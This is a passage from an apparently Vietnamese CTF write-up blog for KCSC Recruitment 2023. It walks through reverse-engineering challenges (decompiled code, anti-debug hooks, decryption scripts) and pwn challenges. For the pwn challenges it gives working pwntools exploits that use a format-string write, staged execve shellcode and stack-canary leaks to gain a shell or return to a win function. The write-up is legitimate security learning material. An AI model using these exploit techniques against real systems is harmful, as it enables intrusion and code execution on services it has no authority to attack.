hàm main sau khi đã được rename các hàm, các biến int __cdecl main_0(int argc, const char **argv, const char **envp) { FILE *v3; // eax char v5; // [esp+0h] [ebp-164h] char v6; // [esp+0h] [ebp-164h] size_t v7; // [esp+10h] [ebp-154h] int round; // [esp+DCh] [ebp-88h] int k; // [esp+E8h] [ebp-7Ch] int j; // [esp+F4h] [ebp-70h] int i; // [esp+100h] [ebp-64h] _DWORD *Block; // [esp+10Ch] [ebp-58h] char *subInput; // [esp+130h] [ebp-34h] char input[36]; // [esp+13Ch] [ebp-28h] BYREF __CheckForDebuggerJustMyCode(\u0026unk_FDD015); Block = malloc(16u); for ( i = 0; i \u003c 4; ++i ) { Block[i] = malloc(4u); } j_memset(input, 0, 0x20u); printf(\"Show your skills. What is the flag?\\n\", v5); v3 = _acrt_iob_func(0); fgets(input, 0x20, v3); if ( input[strlen1(input) - 1] == 0xA ) { v7 = strlen1(input) - 1; if ( v7 \u003e= 0x20 ) { j____report_rangecheckfailure(); } input[v7] = 0; } if ( strlen1(input) != 22 ) { goto labelFail; } subInput = (char *)splitInput(input); if ( !subInput ) { goto labelFail; } if ( strlen1(subInput) != 0x10 ) { goto labelFail; } for ( j = 0; j \u003c 4; ++j ) { for ( k = 0; k \u003c 4; ++k ) { *(_BYTE *)(Block[j] + k) = subInput[4 * j + k]; } } for ( round = 0; round \u003c 100; ++round ) { encrypt1((int)Block, 4, 4); encrypt2((int)Block, 4, 4u); encrypt3(Block, 4, 4); encrypt4((int)Block, 4, 4, round + 0x55); } if ( j_checkFlag((char *)Block, 4, 4) ) { printf(\"Good. Nice work\", v6); free(Block); return 0; } else { labelFail: printf(\"Wrong flag! You chicken\", v6); free(Block); return 0; } } Luồng hoạt động chính của chương trình được tóm tắt như sau: Bước 1: Cấp phát động cho Block có kích thước 16 byte. Với mỗi Block[i] lại được tiếp tục cấp phát 4 byte. Mục đích sẽ là tạo một ma trận có kích thước 4x4. Block = malloc(16u); for ( i = 0; i \u003c 4; ++i ) { Block[i] = malloc(4u); } Bước 2: Kiểm tra độ dài input dài 22 bytes, bắt đầu KCSC{, kết thúc bằng }. Bước 3: Chia input thành từng phần rồi cho vào mảng Block for ( j = 0; j \u003c 4; ++j ) { for ( k = 0; k \u003c 4; ++k ) { *(_BYTE *)(Block[j] + k) = subInput[4 * j + k]; } } Bước 4: Duyệt 100 lần, mỗi lần Block sẽ được encrypt bởi 4 hàm mã hóa for ( round = 0; round \u003c 100; ++round ) { encrypt1((int)Block, 4, 4); encrypt2((int)Block, 4, 4u); encrypt3(Block, 4, 4); encrypt4((int)Block, 4, 4, round + 0x55); } Sau khi debug rồi quan sát output, ta sẽ biết được chức năng của các hàm như sau encrypt1 xoay các hàng theo thứ tự từ phải sang trái với số lần là 0, 1, 2, 3. encrypt2 xoay các cột theo thứ tự từ dưới lên trên với số lần là 0, 1, 2, 3 encrypt3 đổi 4 bit đầu và cuối của 1 byte. Ví dụ 0x61 → 0x16 encrypt4 xor với (i + 0x55) với i chạy từ 0 → 99, tương ứng với index của từng round. Bước 5: Sau 100 round encrypt ở trên, Block thu được sẽ đem đi so sánh với chuỗi FDA6FF91ADA0FDB7ABA9FB91EFAFFAA2 ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:1:1","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x02 Fake flag Mấu chốt để giải bài này nằm ở việc phải đi viết lại 4 hàm decrypt ở trên. Đây là code giải mã của mình cho 4 hàm phía trên. def unShiftRow(blk): blk[0] = blk[0][0 : ] + blk[0][ : 0] blk[1] = blk[1][3 : ] + blk[1][ : 3] blk[2] = blk[2][2 : ] + blk[2][ : 2] blk[3] = blk[3][1 : ] + blk[3][ : 1] return blk def unShiftCol(blk): cols = [] unshifted_col = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] # get col for col in range(4): cols.append([blk[row][col] for row in range(4)]) # unshifted col unshifted_col[0] = cols[0][0 : ] + cols[0][ : 0] unshifted_col[1] = cols[1][3 : ] + cols[1][ : 3] unshifted_col[2] = cols[2][2 : ] + cols[2][ : 2] unshifted_col[3] = cols[3][1 : ] + cols[3][ : 1] for i in range(4): for j in range(4): blk[i][j] = unshifted_col[j][i] return blk def unSwapBit(blk): for i in range(4): for j in range(4): blk[i][j] = ((blk[i][j] \u0026 0x0F) \u003c\u003c 4) | ((blk[i][j] \u0026 0xF0) \u003e\u003e 4) return blk def unXor(blk, round): for i in range(4): for j in range(4): blk[i][j] ^= (round + 0x55) def main(): res = \"FDA6FF91ADA0FDB7ABA9FB91EFAFFAA2\" elements = [int(res[i : i+2], 16) for i in range(0, len(res), 2)] block = [elements[i : i+4] for i in range(0, len(elements), 4)] round = 99 while(round \u003e= 0): unXor(block, round) unSwapBit(block) unShiftCol(block) unShiftRow(block) round -= 1 flag = \"KCSC{\" for i in range(4): for j in range(4): flag += chr(block[i][j]) flag += \"}\" print(flag) if __name__ == \"__main__\": main() # KCSC{3a5y_ch41leng3_!} Mình thử chạy lại chương trình với flag thu được KCSC{3a5y_ch41leng3_!} nhưng kết quả sai. ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:1:2","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x03 Anti Debug - Hooking Sau khi trace lại từ đâu, có một hàm tên là TlsCallback_0_0 được chạy trước cả hàm main void *__stdcall TlsCallback_0_0(int a1, int a2, int a3) { void *result; // eax char v4; // [esp+D4h] [ebp-4Ch] BYREF char v5[15]; // [esp+D5h] [ebp-4Bh] BYREF int Src[3]; // [esp+E4h] [ebp-3Ch] BYREF bool v7; // [esp+F3h] [ebp-2Dh] SIZE_T dwSize; // [esp+FCh] [ebp-24h] DWORD flOldProtect[3]; // [esp+108h] [ebp-18h] BYREF LPVOID lpAddress; // [esp+114h] [ebp-Ch] __CheckForDebuggerJustMyCode(\u0026unk_FDD015); result = (void *)IsDebuggerPresent(); if ( !result ) { Src[0] = (int)sub_FD133E; v4 = 0x68; v5[4] = 0xC3; j_memcpy(v5, Src, 4u); dwSize = 6; lpAddress = j_strcmp; v7 = VirtualProtect(j_strcmp, 6u, 0x40u, flOldProtect); return j_memcpy(lpAddress, \u0026v4, dwSize); } return result; } Chương trình có gọi hàm antidebug IsDebuggerPresent. Chúng ta có thể đổi trạng thái của cờ ZF để đi tiếp vào trong. Src[0] = (int)sub_FD133E; v4 = 0x68; v5[4] = 0xC3; j_memcpy(v5, Src, 4u); Sau 4 lệnh phía trên, chúng ta hãy chú ý tới các giá trị này trong stack Đây chính là một đoạn mã assembly nhỏ push sub_FD133E ret Tiếp theo, chương trình gọi VirtualProtect(j_strcmp, 6u, 0x40u, flOldProtect) thay đổi lớp bảo vệ của vùng nhớ với lần lượt 4 đối số: j_strcmp: Địa chỉ bắt đầu của vùng nhớ 6: Kích thước ảnh hưởng của vùng nhớ. Ở đây, vùng nhớ bị thay đổi sẽ từ j_strcmp → j_strcmp + 6 0x40u: PAGE_EXECUTE_READWRITE, kích hoạt quyền thực thi, đọc, viết cho vùng nhớ flOldProtect: Con trỏ trỏ tới biến lưu quyền truy cập cũ của vùng nhớ. Đọc thêm thông tin ở https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect Khi chạy nốt các dòng lệnh còn lại, click vào j_strcmp, ta sẽ thấy push 0xFD133E và ret. Điều đó đồng nghĩa với việc gọi hàm sub_FD133E. Nói tóm lại, khi chúng ta gọi hàm strcmp, nó sẽ thực thi hàm sub_FD133E Click vào hàm sub_FD133E nó lại tiếp tục nhảy tới hàm sub_FD61D0. Đây là mã giả của nó int __cdecl sub_FD61D0(char *input, char *cmpInput) { size_t j; // [esp+D0h] [ebp-78h] size_t v4; // [esp+DCh] [ebp-6Ch] unsigned int i; // [esp+E8h] [ebp-60h] char newCmpInput[44]; // [esp+F4h] [ebp-54h] BYREF char buf[32]; // [esp+120h] [ebp-28h] BYREF __CheckForDebuggerJustMyCode(\u0026unk_FDD015); buf[0] = 7; strcpy(\u0026buf[1], \"|\"); buf[3] = 7; buf[4] = 0x7F; buf[5] = 0x77; buf[6] = 0x78; buf[7] = 1; buf[8] = 0; buf[9] = 0x73; buf[0xA] = 7; strcpy(\u0026buf[0xB], \"u\"); buf[0xD] = 2; buf[0xE] = 3; buf[0xF] = 0x73; buf[0x10] = 7; buf[0x11] = 7; buf[0x12] = 0; buf[0x13] = 0xC; buf[0x14] = 7; buf[0x15] = 0x72; buf[0x16] = 0x7B; buf[0x17] = 0x70; buf[0x18] = 4; buf[0x19] = 0x7F; buf[0x1A] = 3; buf[0x1B] = 4; buf[28] = 7; strcpy(\u0026buf[0x1D], \"q\"); buf[31] = 4; j_memset(newCmpInput, 0, 36u); for ( i = 0; i \u003c 32; ++i ) { newCmpInput[i] = buf[i] ^ cmpInput[i]; } v4 = strlen1(newCmpInput); for ( j = 0; j \u003c v4; ++j ) { if ( input[j] \u003c newCmpInput[j] ) { return -1; } if ( input[j] \u003e newCmpInput[j] ) { return 1; } } return 0; } Tới đây thì rõ ràng rồi, cmpInput bị xor với mảng buf rồi mới được đem đi so sánh với input của chúng ta. Mình chỉ cần xor ngược lại là có thể giải được bài toán và thu được flag. def unShiftRow(blk): blk[0] = blk[0][0 : ] + blk[0][ : 0] blk[1] = blk[1][3 : ] + blk[1][ : 3] blk[2] = blk[2][2 : ] + blk[2][ : 2] blk[3] = blk[3][1 : ] + blk[3][ : 1] return blk def unShiftCol(blk): cols = [] unshifted_col = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]] # get col for col in range(4): cols.append([blk[row][col] for row in range(4)]) # unshifted col unshifted_col[0] = cols[0][0 : ] + cols[0][ : 0] unshifted_col[1] = cols[1][3 : ] + cols[1][ : 3] unshifted_col[2] = cols[2][2 : ] + cols[2][ : 2] unshifted_col[3] = cols[3][1 : ] + cols[3][ : 1] for i in range(4): for j in range(4): blk[i][j] = unshifted_col[j][i] return blk def unSwapBit(blk): for i in range(4): for j in range(4): blk[i][j] = ((blk[i][j] \u0026 0x0F) \u003c\u003c 4) | ((blk[i][j] \u0026 0xF0) \u003e\u003e 4) return blk def unXor(blk, round): for i in range(4): for j in range(4","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:1:3","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"rev/dynamic function (2 solves) Challenge Information 2 solves / 496 pts / by sonx Given files: rev_dynamic_function.rar Description: Unless I am in motion, I remain invisible. ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:2:0","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x01 Overview Decompile file exe bằng IDA64, sau khi đổi tên các hàm, các biến, chúng ta thu được hàm main() như sau int __cdecl main_0(int argc, const char **argv, const char **envp) { FILE *v3; // eax size_t subInputLength; // eax char v6; // [esp+0h] [ebp-14Ch] char v7; // [esp+0h] [ebp-14Ch] size_t v8; // [esp+10h] [ebp-13Ch] size_t j; // [esp+DCh] [ebp-70h] unsigned int i; // [esp+E8h] [ebp-64h] void (__cdecl *lpAddress)(char *, char *, size_t); // [esp+F4h] [ebp-58h] char *output; // [esp+10Ch] [ebp-40h] char *subInput; // [esp+118h] [ebp-34h] char input[36]; // [esp+124h] [ebp-28h] BYREF __CheckForDebuggerJustMyCode(\u0026unk_D5C017); j_memset(input, 0, 0x20u); malloc(0x19u); output = (char *)malloc(0x19u); printf(\"Show your skills. What is the flag?\\n\", v6); v3 = _acrt_iob_func(0); fgets(input, 0x20, v3); if ( input[strlen1(input) - 1] == 0xA ) { v8 = strlen1(input) - 1; if ( v8 \u003e= 0x20 ) { j____report_rangecheckfailure(); } input[v8] = 0; } if ( strlen1(input) == 30 \u0026\u0026 (subInput = (char *)splitInput(input)) != 0 \u0026\u0026 strlen1(subInput) == 24 ) { lpAddress = (void (__cdecl *)(char *, char *, size_t))VirtualAlloc(0, 0xA4u, 0x1000u, 0x40u); if ( lpAddress ) { for ( i = 0; i \u003c 0xA4; ++i ) { *((_BYTE *)lpAddress + i) = byte_D57C50[i] ^ 0x41; } subInputLength = strlen1(subInput); lpAddress(subInput, output, subInputLength); VirtualFree(lpAddress, 0xA4u, 0x8000u); for ( j = 0; j \u003c strlen1(subInput); ++j ) { if ( output[j] != expectedOutput[j] ) { goto labelFail; } } printf(\"Not uncorrect ^_^\", v7); return 0; } else { perror(\"VirtualAlloc failed\"); return 1; } } else { labelFail: printf(\"Not correct @_@\", v7); return 0; } } Tóm tắt luồng hoạt động của chương trình trên: Bước 1: Cho người dùng nhập vào input từ bàn phím. Đổi byte cuối cùng \\n (khi nhấn enter) thành byte kết thúc chuỗi \\x00. Bước 2: So sánh độ dài chuỗi input với 30, hàm con splitInput() kiểm tra input có bắt đầu bằng chuỗi KCSC{ và kết thúc bằng } hay không. Kết thúc kiểm tra, thu được output có độ dài 24 byte chính là phần ở giữa của chuỗi bắt đầu và kết thúc. Bước 3: VirtualAlloc(0, 0xA4u, 0x1000u, 0x40u) phân bổ một vùng nhớ mới với 4 đối số như sau: 0: Hàm tự động chọn địa chỉ cho vùng nhớ 0xA4u: Kích thước của vùng nhớ 0x1000u: MEM_COMMIT, đặt quyền truy cập cho vùng nhớ 0x40u: PAGE_EXECUTE_READWRITE, đặt quyền đọc ghi, thực thi cho vùng nhớ Đọc thêm thông tin ở https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc Hàm sẽ trả về là địa chỉ của vùng nhớ mới, được lưu trong biến lpAddress Bước 4: Chương trình ghi lần lượt các byte vào vùng nhớ mới for ( i = 0; i \u003c 0xA4; ++i ) { *((_BYTE *)lpAddress + i) = byte_D57C50[i] ^ 0x41; } Bước 5: Tiếp theo, chương trình sẽ thực hiện các lệnh trong vùng nhớ mới. Sau khi kết thúc việc gọi hàm, ta sẽ thu được output lpAddress(subInput, output, subInputLength); Bước 6: So sánh output với chuỗi byte expectedOutput có sẵn for ( j = 0; j \u003c strlen1(subInput); ++j ) { if ( output[j] != expectedOutput[j] ) { goto labelFail; } } ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:2:1","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x02 Dynamic Analysis Sau bản tóm tắt trên, mấu chốt của bài toán nằm ở đoạn code gọi hàm động lpAddress. Chúng ta cần phải biết nó thực sự đã làm gì với input ban đầu. Đặt breakpoint tại dòng 44, ấn F7 tại text:00D558BD để đi sâu vào từng câu lệnh. Input ban đầu chúng ta nhập sẽ là KCSC{aaaaaaaaaaaaaaaaaaaaaaaa} .text:00D558BD call [ebp+lpAddress] Đây là một phần mã assembly của hàm lpAddress Ta có thể click chuột phải, chọn chức năng Create function (phím P) và thu được hàm như sau int __cdecl sub_DF0000(int a1, int a2, int a3) { _WORD v4[15]; // [esp+2h] [ebp-1Eh] BYREF strcpy((char *)v4, \"reversing_is_pretty_cool\"); *(_DWORD *)\u0026v4[0xD] = 0; while ( *(int *)\u0026v4[0xD] \u003c a3 ) { HIBYTE(v4[0xC]) = 0x10 * (*(char *)(*(_DWORD *)\u0026v4[0xD] + a1) % 0x10) + *(char *)(*(_DWORD *)\u0026v4[0xD] + a1) / 0x10; *(_BYTE *)(a2 + *(_DWORD *)\u0026v4[0xD]) = HIBYTE(v4[0xC]) ^ *((_BYTE *)v4 + *(_DWORD *)\u0026v4[0xD]); ++*(_DWORD *)\u0026v4[0xD]; } return 0; } Ta cần sửa lại kiểu dữ liệu của một số biến cho dễ đọc hơn. Ấn y vào tên hàm để định nghĩa lại các tham số của hàm. Đổi lại tên, kiểu dữ liệu và kích thước cho mảng v4 Mình biết mảng buf có size 25 bởi vì nó strcpy chuỗi “reversing_is_pretty_cool” có size 25 vào buf. Đến đây, ta đã thu được một hàm nhìn code rất đẹp int __cdecl sub_DF0000(char *subInput, char *output, int subInputLength) { char buf[25]; // [esp+2h] [ebp-1Eh] BYREF char tmp; // [esp+1Bh] [ebp-5h] int i; // [esp+1Ch] [ebp-4h] strcpy(buf, \"reversing_is_pretty_cool\"); for ( i = 0; i \u003c subInputLength; ++i ) { tmp = 16 * (subInput[i] % 16) + subInput[i] / 16; output[i] = tmp ^ buf[i]; } return 0; } Đoạn encrypt trên rất ngắn gọn, swap 4 bit trước với 4 bit sau của 1 byte. Ví dụ 0x61 → 0x16 Tiếp theo sẽ xor kết quả trên với mảng buf rồi đi so sánh với expectedOutput. Chúng ta dễ dàng viết được code giải mã và thu được flag. buf = [0x72, 0x65, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6E, 0x67, 0x5F, 0x69, 0x73, 0x5F, 0x70, 0x72, 0x65, 0x74, 0x74, 0x79, 0x5F, 0x63, 0x6F, 0x6F, 0x6C] expectedOutput = [0x44, 0x93, 0x51, 0x42, 0x24, 0x45, 0x2E, 0x9B, 0x01, 0x99, 0x7F, 0x05, 0x4D, 0x47, 0x25, 0x43, 0xA2, 0xE2, 0x3E, 0xAA, 0x85, 0x99, 0x18, 0x7E] flag = \"KCSC{\" for i in range(len(buf)): res = expectedOutput[i] ^ buf[i] swapRes = ((res \u0026 0x0F) \u003c\u003c 4) | ((res \u0026 0xF0) \u003e\u003e 4) flag += chr(swapRes) flag += \"}\" print(flag) FLAG: KCSC{correct_flag!submit_now!} Challenge Information 28 solves / 100 pts Given files: chall.exe Description: Làm nóng người 1 tí Flag format: KCSC{} \r---\rChương trình cho phép người dùng nhập vào và sẽ so sánh với một chuỗi cho trước. ```python\rint __fastcall main(int argc, const char **argv, const char **envp)\r{\rchar Str1[256]; // [rsp+20h] [rbp-60h] BYREF\r_main(argc, argv, envp);\rputs(\"Nh4p. v40` f149 v4` nh4n' [3N73R]\");\rwhile ( 1 )\r{\rif ( !gets(Str1) )\r{\rreturn 0;\r}\rif ( !strcmp(Str1, \"S0NTQ3tDaDQwYF9NfF98bjlgX0QzTidfVjAxJ183N1wvX0tDU0N9\") )\r{\rbreak;\r}\rputs(\"Sai roi. Hay thu lai\");\r}\rreturn printf(\"Great!!!\");\r}\r```\rChuỗi này khả năng cao bị mã hóa base64. Lên [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)\u0026input=UzBOVFEzdERhRFF3WUY5TmZGOThiamxnWDBRelRpZGZWakF4SjE4M04xd3ZYMHREVTBOOQ) decode và thu được flag `KCSC{Ch40_M|_|n9_D3N'_V01'_77\\/_KCSC}`\r## rev/Images\rChallenge Information 3 solves / 484 pts Given files: Images.zip Description: It doesnt hard as u expected ^^ \r**Solution**\rBài này cho chúng ta một loạt hình ảnh chứa mã assembly. Sau khi đọc sơ qua, mình thấy đoạn code với format như dưới đây được lặp đi lặp lại ```nasm\rmov eax, 1\rimul rax, 8\rmovsx eax, [rbp+rax+230h+Buffer]\rcmp eax, 95\rjnz loc_140012834\r```\rtrong đó `loc_140012834` là đoạn mã in ra kết quả sai. Điều kiện kiểm tra có thể được mô phỏng lại như sau\r```python\rBuffer[1 * 8] == 95\r``` Lấy tất cả các giá trị như trên và convert sang ký tự, ta thu được flag ``KCSC{Cam_on_vi_da_kien_nhan_nhin_het_dong_anh_nay`}``\r```python\rflag = [0] * 54 flag[0] = 75\rflag[0x1a] = 110\rflag[14] = 101\rflag[18] = 104\rflag[34] = 101\rflag[23] = 110\rflag[","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:2:2","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"pwn/Format (0 solve) Challenge Information 0 solve / 500 pts / by Nuuuuuuuu Given files: format.zip Description: You don’t have to do anything, i will printf the flag for you^^ nc 103.162.14.116 12001 ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:3:0","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x01 Finding the bug Load file vào IDA64, dễ thấy có lỗ hổng FMT ở dòng printf(buf) int __fastcall main(int argc, const char **argv, const char **envp) { char buf[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); puts(\"Do you want to get flag^^\"); buf[read(0, buf, 0x25uLL)] = 0; printf(buf); system(cmd); return 0; } ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:3:1","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x02 Exploiting FMT bug Chương trình gọi hàm system với cmd là một câu lệnh echo. Ý tưởng để giải bài này sẽ là tận dụng bug FMT viết thêm chuỗi ;sh sau câu lệnh đó để lấy shell. from pwn import * elf = ELF(\"./format\", checksec = False) # p = process(elf.path) p = remote(\"103.162.14.116\", 12001) pause() write_addr = 0x4040B5 sh = 0x68733b # ;sh pay = f\"%{sh}c%10$n\".encode().ljust(0x10, b\"\\x00\") + p64(write_addr) p.sendline(pay) p.interactive() FLAG: KCSC{F1rs1_Pr0b13m_w1Th_pR1Ntf} ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:3:2","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"pwn/pwn1 (0 solve) Challenge Information 0 solve / 500 pts Given files: pwn1 Description: every things start with assembly nc 103.162.14.116 20001 ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:4:0","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x01 Overview Sử dụng IDA64 decompile chương trình, ta thu được mã giả của hàm main như sau int __cdecl main(int argc, const char **argv, const char **envp) { void *buf; // [rsp+0h] [rbp-10h] setup(argc, argv, envp); buf = mmap((void *)0x1337000, 0x1000uLL, 7, 33, -1, 0LL); puts(\"Let warm up a bit with shellcode , shall we?\"); read(0, buf, 0xCuLL); puts(\"OK let see how your shellcode work!!!!\"); ((void (*)(void))buf)(); return 0; } Ta thấy, chương trình mmap 1000 byte, bắt đầu tại địa chỉ 0x1337000 với full quyền rwx và yêu cầu chúng ta viết shellcode. Vấn đề ở đây là chúng ta chỉ nhập được tối đa 12 byte. Vậy nên không thể viết trực tiếp shellcode lấy shell như thông thường được. Mình sẽ mở rộng kích thước số byte được nhập ra và gọi lại hàm read. ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:4:1","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x02 Final script from pwn import * import time exe = ELF(\"./pwn1\") # libc = ELF(\"./libc.so.6\") # ld = ELF(\"./ld.so.6\") context.log_level = \"debug\" context.arch = \"amd64\" context.binary = exe # p = process(exe.path) p = remote(\"103.162.14.116\", 20001) def sla(*args): return p.sendlineafter(args[0], args[1]) def sl(*args): return p.sendline(args[0]) shellcode1 = asm(\"\"\" mov edx, 0xff add r13, 87 jmp r13 \"\"\") p.sendafter(\"shall we?\\n\", shellcode1) shellcode2 = asm(\"\"\" mov rax, 29400045130965551 push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall \"\"\") time.sleep(2) p.sendline(shellcode2) p.interactive() FLAG: KCSC{https://www.youtube.com/watch?v=dQw4w9WgXcQ} ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:4:2","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"pwn/Simple Overflow (2 solves) Challenge Information 2 solves / 496 pts / by Nuuuuuuuu Given files: simple_overflow.zip Description: simple description since it’s simple overflow nc 103.162.14.116 12004 ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:5:0","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x01 Finding the bug Chúng ta có thể thấy sự xuất hiện của lỗ hổng BOF ở hàm save_data tại chức năng read. unsigned __int64 __fastcall save_data(const char *a1) { int i; // [rsp+14h] [rbp-4Ch] unsigned __int64 v3; // [rsp+18h] [rbp-48h] __int64 buf[2]; // [rsp+20h] [rbp-40h] BYREF char s[8]; // [rsp+30h] [rbp-30h] BYREF __int64 v6; // [rsp+38h] [rbp-28h] __int64 v7; // [rsp+40h] [rbp-20h] __int64 v8; // [rsp+48h] [rbp-18h] unsigned __int64 v9; // [rsp+58h] [rbp-8h] v9 = __readfsqword(0x28u); *(_QWORD *)s = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0LL; buf[0] = 0LL; buf[1] = 0LL; snprintf(s, 0x20uLL, \"Hi %s, let me keep your data\\n\", a1); printf(\"%s\", s); puts(\"How many data you want to save?\"); v3 = get_long(); fflush(stdin); for ( i = 0; v3 \u003e i; ++i ) { puts(\"Data: \"); read(0, buf, 256uLL); strcpy(saved_data, (const char *)buf); puts(saved_data); } puts(\"Your data is saved\"); return v9 - __readfsqword(0x28u); } Ý tưởng khai thác sẽ gồm 2 bước: Lần đầu sẽ leak giá trị canary. Lần thứ hai sẽ overwrite retaddr. ","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:5:1","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"0x02 Final script #!/usr/bin/env python3 from pwn import * exe = ELF(\"./simple_overflow\") # libc = ELF(\"./libc.so.6\") # ld = ELF(\"./ld-2.35.so\") context.os = \"linux\" context.arch = \"amd64\" context.log_level = \"debug\" context.binary = exe # p = process(exe.path) p = remote(\"103.162.14.116\", 12004) def sla(*args): return p.sendlineafter(args[0], args[1]) def sl(*args): return p.sendline(args[0]) def sa(*args): return p.sendafter(args[0], args[1]) def rl(): return p.recvline() def GDB(): gdb.attach(p, gdbscript = \"\"\" b *save_data+0x00eb continue \"\"\") pause() # GDB() sla(\"name: \\n\", b\"hacker\") sla(\"save?\\n\", b\"2\") pay1 = b\"A\" * 7 * 8 + b\"A\" sa(\"Data: \\n\", pay1) p.recvuntil(pay1) canary = u64(b\"\\x00\" + p.recv(7)) log.info(f\"canary = 0x%x\" % canary) fakerbp = 0xdeadbeef win = exe.symbols[\"win\"] ret = 0x401526 pay2 = b\"B\" * 7 * 8 + p64(canary) + p64(fakerbp) + p64(ret) + p64(win) sa(\"Data: \\n\", pay2) p.interactive() FLAG: KCSC{Y0u_g0T_1h3_Sup3R_s3Cr31_F14g} Challenge Information 6 solves / 400 pts / by Wan Given files: chall chall.c Description: simple description since it’s simple overflow nc 103.162.14.116 12005 \r**Solution**\rĐề bài cho chúng là luôn source code, quan sát kỹ thì thấy có bug BOF để ret2win. Nhưng ở hàm `filter` có check 1 số string ```c\rif(strstr(buf, \"v\\x11@\") || strstr(buf, \"w\\x11@\") || strstr(buf, \"z\\x11@\") != NULL)\r{\rprintf(\"bypass strstr pls\");\rexit(0);\r}\r```\rĐịa chỉ hàm `win` nằm ở `0x401186` nghĩa là chỉ bị trùng 2 byte `\\x11@` nên ta sẽ không bị kill. Chương trình có lỗi SIGSEGV do stack layout chưa được căn chỉnh. Vì vậy mình nhảy luôn vào `win + 4` để tránh việc `push rbp` vào stack. ```python\r#!/usr/bin/env python3\rfrom pwn import *\rexe = ELF(\"./chall\") # libc = ELF(\"./libc.so.6\")\r# ld = ELF(\"./ld-2.35.so\")\rcontext.os = \"linux\"\rcontext.arch = \"amd64\"\rcontext.log_level = \"debug\"\rcontext.binary = exe p = process(exe.path)\r# p = remote(\"localhost\", 1337)\rdef sla(*args):\rreturn p.sendlineafter(args[0], args[1]) def sl(*args):\rreturn p.sendline(args[0])\rdef sa(*args):\rreturn p.sendafter(args[0], args[1]) def rl(): return p.recvline()\rdef GDB():\rgdb.attach(p, gdbscript = \"\"\"\rb* main+127\rcontinue\r\"\"\")\rpause() # GDB()\rwin = exe.symbols[\"win\"] + 4\rpay = b\"A\"*7*8 + p64(win) sa(b\"play\\n\", pay)\rp.interactive()\r# KCSC{bypass_strstr_by_null_byte}\r``` --\rChallenge Information 0 solve / 500 pts / by sonx Given files: rev_mission_impossible.rar Description: Defeat all the adversaries to protect your base. We’re relying --\r","date":"2023-12-31","objectID":"/2023-kcsc-recruitment/:5:2","tags":["Reverse-Engineering","Pwnable","KCSC Recruitment","2023"],"title":"KCSC Recruitment 2023","uri":"/2023-kcsc-recruitment/"},{"categories":null,"content":"Solutions for some challenges in BKCTF 2023 by ducdatdau","date":"2023-08-19","objectID":"/2023-bkctf/","tags":["Reverse-Engineering","Pwnable","BKCTF","2023"],"title":"BKCTF 2023","uri":"/2023-bkctf/"},{"categories":null,"content":" img { box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; border-radius: 6px; display: block; margin: 0 auto 15px; } BKCTF was the first CTF I attended on-site. It was hosted by BKSEC, a club at Hanoi University of Science and Technology (HUST), a leading engineering school in Vietnam. HUST 